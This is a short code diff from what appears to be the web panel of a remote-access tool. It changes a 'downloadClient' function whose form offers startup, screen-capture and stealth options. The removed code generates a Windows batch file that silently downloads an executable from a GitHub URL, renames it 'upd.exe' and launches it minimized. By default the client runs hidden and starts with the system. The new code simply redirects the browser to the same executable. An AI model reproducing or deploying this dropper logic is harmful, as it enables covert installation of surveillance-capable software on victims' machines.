@@ -315,30 +315,7 @@ function openClient(name){
 }
 
 function downloadClient(){
- const name=document.getElementById('clientName').value.trim();
- const startup=document.getElementById('startupToggle').checked;
- const ping=document.getElementById('pingToggle').checked;
- const screen=document.getElementById('screenToggle').checked;
- const stealth=document.getElementById('stealthToggle').checked;
- const hasOpts=name||!startup||!ping||!screen||!stealth;
- if(!hasOpts){
-  window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
-  return;
- }
- let args='';
- if(name) args+=' --name "'+name+'"';
- if(!startup) args+=' --no-startup';
- if(!ping) args+=' --no-ping';
- if(!screen) args+=' --no-screen';
- if(!stealth) args+=' --show';
- const exeUrl='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
- const bat='@echo off\r\ncd /d "%~dp0"\r\ncurl -sL "'+exeUrl+'" -o upd.exe\r\nstart /min upd.exe'+args+'\r\n';
- const blob=new Blob([bat],{type:'application/bat'});
- const a=document.createElement('a');
- a.href=URL.createObjectURL(blob);
- a.download='client.bat';
- a.click();
- URL.revokeObjectURL(a.href);
+ window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
 }
 
 async function removeClient(name){
